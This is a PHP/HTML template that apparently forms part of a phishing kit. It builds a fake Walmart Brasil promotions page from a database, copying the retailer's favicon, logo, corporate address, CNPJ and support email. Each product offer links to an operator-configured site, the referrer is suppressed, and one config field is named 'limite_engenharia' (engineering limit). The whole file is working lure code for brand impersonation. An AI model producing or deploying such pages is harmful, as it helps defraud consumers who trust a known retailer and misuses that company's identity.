<?php

require_once ("function/config.php");
require_once ("function/conexao.php");

$dadosA = "SELECT* FROM configuracao where id=1";
$conA = $mysqli -> query($dadosA) or die ($mysqli -> error);


while ($consultaA= $conA -> fetch_array()){
	
	$link_site = $consultaA ["link_site"];
	$limite = $consultaA ["limite_engenharia"];
	$exibi = $consultaA ["exibi_preco"];

}

$dados = "SELECT* FROM produtos  Order By id desc $limite ";
$con1 = $mysqli -> query($dados) or die ($mysqli -> error);





?>









<!DOCTYPE html>
<html dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">      	
        <meta name="description" content="Promoções estarão dísponiveis por pouco tempo, entre na nossa loja e confira !"> 
        <meta http-equiv="X-UA-Compatible" content="IE=10">    
        <meta http-equiv="pragma" content="no-cache">
        <meta name="referrer" content="never">
        <link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon">
        <title> Walmart - Promoções</title>
		
		</head>
	<body class="popoutBody notIE8 ms-fwt-r" style="display: block;">                      
<div>
<div style="background-color:#e2e2e2">
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="background-color:#e2e2e2; font-family:Tahoma,Arial,Helvetica,sans-serif; font-size:14px; color:#666">
<tbody>
<tr>
<td style="padding:0 20px 20px">
<table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td>
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="font-size:11px; color:#666">
<tbody>
<tr>
<td height="60"><strong>Compre agora mesmo.</strong></td>
<td align="right"></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style="border-top:solid 2px #ffb825">
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="background-color:#fff">
<tbody>
<tr>
<td height="52" style="padding-left:20px"><strong><a href="" target="_blank" rel="noopener noreferrer" title="Walmart.com" style="font-size:18px; color:#2484c6; text-decoration:none"><img data-imagetype="External" src="../assets/img/email-remarketing-logo-walmart.png" width="130" height="16" border="0" alt="Walmart.com"></a></strong></td>
<td align="right" style="padding-right:20px; font-size:13px; color:#2484c6"></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="background-color:#fff">
<tbody>
<tr>
<td style="padding:20px 20px 40px 20px; color:#666">
<p style="font-size:18px">Grande oportunidade para você !<span style="color:#2484c6"><strong></strong></span></p>
<p style="font-size:14px">Temos diversas ofertas que podem interessa-lo :)</p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style="border-top:solid 1px #d4d4d4">
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="background-color:#fff">
<tbody>


<?php while ($consulta1= $con1 -> fetch_array()){?> 


<tr>
<td width="330" style="padding:20px 0 20px 20px; font-size:14px; color:#666">
<p><a href="<?php echo $link_site ?>?category=<?php $url = $consulta1 ["url"];  echo  substr($url, 27, 150); ?>&id=<?php echo $consulta1 ["id"]; ?>" target="_blank" rel="noopener noreferrer"><img data-imagetype="External" src="<?php echo $consulta1 ["img"]; ?>" width="290" height="290" border="0"></a></p>
</td>
<td style="padding:20px 20px 20px 0"><a href="<?php echo $link_site ?>?category=<?php $url = $consulta1 ["url"];  echo  substr($url, 27, 150); ?>&id=<?php echo $consulta1 ["id"]; ?>" target="_blank" rel="noopener noreferrer" style="color:#2484c6; text-decoration:none"><span style="font-size:18px; color:#f37b20; line-height:30px"><strong>BAIXAMOS O PREÇO </strong></span><br>
<span style="font-size:20px"><?php echo $consulta1 ["nome_produto"]; ?></span><br><br>
<?php if ($exibi == 1 ){ ?>
<span style="font-size:20px"><font color="orange" >Apenas: R$ <?php $preco = $consulta1 ["preco"]; echo number_format($preco,2,",",".") ?></span><br>
<?php } ?>

</a><a href="<?php echo $link_site ?>?category=<?php $url = $consulta1 ["url"];  echo  substr($url, 27, 150); ?>&id=<?php echo $consulta1 ["id"]; ?>" target="_blank" rel="noopener noreferrer" style="text-decoration:none">
<p style="font-size:16px; color:#666"><span style="font-size:16px; padding:12px 36px; color:#fff; background-color:#5c9e0d; text-decoration:none; line-height:42px"><strong>clique<span style="color:#ffb825">.</span>compre</strong></span> </p>
</a></td>
</tr>

<?php } ?>


</tbody>
</table>
</td>
</tr>


<tr>
<td>
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="background-color:#f2f2f2; font-size:14px; color:#666">
<tbody>
<tr>
<td height="90" style="padding:0 20px"><strong style="font-size:18px; line-height:24px">Alguma dúvida?</strong><br>
<a href=""><strong>clique<span style="color:#ffb825">.</span>fale</strong></a> com a gente! </td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" style="background-color:#d4d4d4; font-size:10px; color:#666">
<tbody>
<tr>
<td width="50">&nbsp;</td>
<td width="560">
<p style="font-family: Verdana, Geneva, sans-serif, serif, EmojiFont; font-size: 10px; color: rgb(102, 102, 102);"><b>WAL-MART BRASIL LTDA</b><br>
Com sede na Avenida Tucunaré, nº 125<br>
Tamboré, Barueri/SP - CEP 06460-020<br>
Inscrita no CNPJ/MF sob o nº 00.063.960/0001-09 <br>
Inscrição Estadual nº 206.228.672.119<br>
E-mail: <a href="mailto:atendimento@walmart.com.br" target="_blank" rel="noopener noreferrer" style="font:11px Arial,Helvetica,sans-serif; color:#3a6ac3">atendimento@walmart.com.br</a> </p>
</td>
<td width="50">&nbsp;</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>


</div>
</div></div> <div style="display: none;"></div> </div> </div></div> <div style="display: none;"></div> </div></div> </div> </div></div></div><div autoid="_rp_G" class="popupShadow" ispopup="1" ismodal="true" style="display: none;"></div><div autoid="_rp_H" class="popupShadow" ispopup="1" ismodal="true" style="display: none;"></div></div></div></body></html>